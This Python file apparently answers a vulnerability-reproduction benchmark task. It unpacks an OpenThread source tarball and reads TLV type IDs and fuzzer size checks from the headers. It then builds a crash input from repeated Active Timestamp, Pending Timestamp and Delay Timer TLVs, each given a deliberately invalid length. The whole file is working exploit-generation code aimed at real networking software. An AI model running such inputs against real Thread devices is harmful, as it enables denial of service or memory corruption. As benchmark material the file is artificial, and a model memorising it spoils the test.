import os
import tarfile
import tempfile
import re
import math
import shutil


HEADER_EXTS = {'.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.tpp'}


def _extract_macros(root_dir):
    macros = {}
    pattern = re.compile(r'\s*#\s*define\s+(\w+)\s+([()\wxX0-9]+)')
    for dirpath, _, filenames in os.walk(root_dir):
        for name in filenames:
            _, ext = os.path.splitext(name)
            if ext not in HEADER_EXTS:
                continue
            fpath = os.path.join(dirpath, name)
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    for line in f:
                        if 'OT_MESHCOP_TLV_' not in line and 'DATASET' not in line:
                            continue
                        m = pattern.match(line)
                        if not m:
                            continue
                        macro_name = m.group(1)
                        val_str = m.group(2).strip()
                        # Strip surrounding parentheses if present
                        if val_str.startswith('(') and val_str.endswith(')'):
                            val_str = val_str[1:-1].strip()
                        try:
                            val = int(val_str, 0)
                        except ValueError:
                            continue
                        macros[macro_name] = val
            except OSError:
                continue
    return macros


def _extract_enum_value(root_dir, symbol_variants):
    # Try to find explicit enumerator assignments like "kActiveTimestamp = 14"
    pattern = re.compile(
        r'(' + '|'.join(re.escape(s) for s in symbol_variants) + r')\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
        re.MULTILINE,
    )
    for dirpath, _, filenames in os.walk(root_dir):
        for name in filenames:
            _, ext = os.path.splitext(name)
            if ext not in HEADER_EXTS:
                continue
            fpath = os.path.join(dirpath, name)
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    text = f.read()
            except OSError:
                continue
            m = pattern.search(text)
            if m:
                try:
                    return int(m.group(2), 0)
                except ValueError:
                    continue
    return None


def _find_tlv_type(macros, root_dir, keyword_sets, fallback_value):
    # keyword_sets: list of lists of substrings to search in macro names
    for keywords in keyword_sets:
        for name, val in macros.items():
            upper = name.upper()
            if 'OT_MESHCOP_TLV_' not in upper:
                continue
            if all(kw in upper for kw in keywords):
                return val
    # Fallback to enum-based extraction
    symbol_variants = []
    for kws in keyword_sets:
        # Build likely enum symbol names like kActiveTimestamp, ActiveTimestamp
        base = ''.join(kw.title() for kw in kws if kw not in ('TLV',))
        if not base:
            continue
        symbol_variants.append(base)
        symbol_variants.append('k' + base[0].upper() + base[1:])
    enum_val = _extract_enum_value(root_dir, symbol_variants)
    if enum_val is not None:
        return enum_val
    # Final static fallback
    return fallback_value


def _extract_dataset_max_len(macros):
    candidates = []
    for name, val in macros.items():
        upper = name.upper()
        if 'DATASET' in upper and 'MAX' in upper and ('LENGTH' in upper or 'SIZE' in upper):
            candidates.append(val)
    if candidates:
        return max(1, min(candidates))
    # Reasonable default for OpenThread operational dataset max length
    return 254


def _extract_min_input_size(root_dir):
    min_size = 1
    # Find fuzzer harness files
    harness_paths = []
    for dirpath, _, filenames in os.walk(root_dir):
        for name in filenames:
            _, ext = os.path.splitext(name)
            if ext not in HEADER_EXTS:
                continue
            fpath = os.path.join(dirpath, name)
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    text = f.read()
            except OSError:
                continue
            if 'LLVMFuzzerTestOneInput' in text:
                harness_paths.append((fpath, text))
    if not harness_paths:
        return min_size

    # Regex for size checks
    lt_pattern = re.compile(r'size\s*<\s*(\d+)')
    le_pattern = re.compile(r'size\s*<=\s*(\d+)')

    for _, text in harness_paths:
        for m in lt_pattern.finditer(text):
            try:
                n = int(m.group(1))
                if n > min_size:
                    min_size = n
            except ValueError:
                continue
        for m in le_pattern.finditer(text):
            try:
                n = int(m.group(1)) + 1
                if n > min_size:
                    min_size = n
            except ValueError:
                continue
    return max(min_size, 1)


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp_dir = tempfile.mkdtemp(prefix="src-")
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                tf.extractall(tmp_dir)

            macros = _extract_macros(tmp_dir)

            # Extract vulnerable TLV type IDs with fallbacks based on Thread spec / OpenThread defaults
            active_type = _find_tlv_type(
                macros,
                tmp_dir,
                keyword_sets=[['ACTIVE', 'TIMESTAMP'], ['ACTIVETIMESTAMP']],
                fallback_value=14,  # commonly OT_MESHCOP_TLV_ACTIVETIMESTAMP
            )
            pending_type = _find_tlv_type(
                macros,
                tmp_dir,
                keyword_sets=[['PENDING', 'TIMESTAMP'], ['PENDINGTIMESTAMP']],
                fallback_value=51,  # commonly OT_MESHCOP_TLV_PENDINGTIMESTAMP
            )
            delay_type = _find_tlv_type(
                macros,
                tmp_dir,
                keyword_sets=[['DELAY', 'TIMER'], ['DELAYTIMER']],
                fallback_value=52,  # commonly OT_MESHCOP_TLV_DELAYTIMER
            )

            vuln_types = []
            # Prefer Pending + Delay (pending dataset path), then Active
            if pending_type is not None:
                vuln_types.append(pending_type & 0xFF)
            if delay_type is not None:
                vuln_types.append(delay_type & 0xFF)
            if active_type is not None:
                vuln_types.append(active_type & 0xFF)

            if not vuln_types:
                # Absolute fallback to known typical values
                vuln_types = [51, 52, 14]

            # Build repeating TLV pattern: each TLV has length 1 (invalid for these types)
            # TLV format assumed: [Type (1B), Length (1B), Value (1B)]
            tlv_pattern = bytearray()
            for t in vuln_types:
                tlv_pattern.extend((t & 0xFF, 1, 0))
            if not tlv_pattern:
                tlv_pattern.extend((14, 1, 0))  # safety fallback

            unit_len = len(tlv_pattern)

            min_input_size = _extract_min_input_size(tmp_dir)
            dataset_max_len = _extract_dataset_max_len(macros)

            # Number of repetitions to satisfy harness minimum size
            num_repeats = max(1, math.ceil(min_input_size / unit_len))
            max_repeats = max(1, dataset_max_len // unit_len)
            if num_repeats > max_repeats:
                num_repeats = max_repeats

            data = bytes(tlv_pattern) * num_repeats
            return data
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
